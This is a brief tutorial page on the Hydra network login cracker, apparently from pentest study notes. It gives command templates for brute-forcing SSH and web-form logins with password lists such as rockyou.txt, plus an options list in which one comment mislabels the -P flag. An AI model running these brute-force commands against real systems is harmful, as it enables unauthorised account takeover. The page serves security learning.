---
title: Hydra
description: Hydra is a parralelized network login cracker, to perform brute force attacks to guess username and password combinations.
---

[Hydra](https://github.com/vanhauser-thc/thc-hydra) is a brute force online pasword cracking program, a quick system login password "hacking" tool. It can run through a list and “brute force” some authentication services. Imagine trying to manually guess someone’s password on a particular service ([SSH](/docs/networking/ssh), Web Application Form, [FTP](/docs/networking/ftp) or SNMP) - we can use Hydra to run through a password list and speed this process up for us, determining the correct password.

:::warning
This shows the importance of using a strong password; if your password is common, doesn’t contain special characters and is not above eight characters, it will be prone to be guessed.
:::

```sh title="Brute force SSH login"
hydra -l <username> -P <full path to pass> <HOST_IP> -t 4 ssh
# -l specifies the SSH username for login
# -P specifies the full path to the password file
# -t 4 specifies the number of parallel tasks to run
```

```sh title="Brute force HTTP login"
hydra -l <username> -P rockyou.txt <HOST_IP> http-post-form "<path>:<login_credentials>:<invalid response>"
# -l specifies the username for login
# -P specifies the password file to use
# http-post-form specifies the HTTP POST form to target
# <path> is the path to the login form on the target web application, e.g. "/login.php"
# <login_credentials> are sent in the format "username=^USER^&password=^PASS^"
# <invalid response> is the text that indicates a failed login attempt, e.g. "Invalid username or password"
```

```sh title="Hydra options"
-L <userlist> # -L specifies a file containing a list of usernames
-l <username> # -l specifies a single username to use
-P <passlist> # -L specifies a file containing a list of usernames
-p <password> # -p specifies a single password to use
-t <number> # -t specifies the number of parallel tasks to run
-C <user:passlist> # -C specifies a file containing a list of usernames and passwords in the format user:password
-s <port> # -s specifies the port to connect to (if the service is not running on the default port)
-h # -h displays the help message
```

### Links

- [Hydra](https://github.com/vanhauser-thc/thc-hydra)
- [Try Hack Me Hydra Room](https://tryhackme.com/room/hydra)
- [Kali Hydra Tool Documentation](https://www.kali.org/tools/hydra/)
- [Kali Hydra Tool Page](https://en.kali.tools/?p=220)
- [Kali Word Lists](https://www.kali.org/tools/wordlists/) - This package contains the [rockyou.txt](https://www.keepersecurity.com/blog/2023/08/04/understanding-rockyou-txt-a-tool-for-security-and-a-weapon-for-hackers/) wordlist
- [Collection of multiple types of lists](https://github.com/danielmiessler/SecLists) - Collection of usernames, passwords, URLs, sensitive data patterns and many more
